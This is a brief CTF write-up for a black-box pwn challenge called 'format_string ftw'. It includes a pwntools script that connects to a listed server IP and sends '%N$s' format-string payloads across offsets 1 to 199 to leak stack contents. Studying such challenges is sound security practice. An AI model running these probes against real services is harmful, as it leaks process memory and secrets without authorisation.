---
hide:
  - tags
draft: true
authors:
  - gr007
date: 2023-06-19
categories:
  - rev
tags:
  - pwn
  - coderush
  - '2023'
comments: true
---

# format_string ftw

## Description

No one should see what I have in stack! Its only mine!

`nc 139.59.0.163 7777`

>Author: `peace_ranger`

## Solution

We are only given a connection information. we can connect to this via netcat. as this is a black box challenge where the clues are given in the challenge name and description, nothing else need to be said. The following exploit should work just fine:

```python
#!/usr/bin/env python

from pwn import *


for i in range(1,200):
    p = remote("139.59.0.163",7777)
    x = f'%{i}$s'
    p.recvline()
    p.sendline(bytes(x,"UTF-8"))
    print(p.recvline())

```
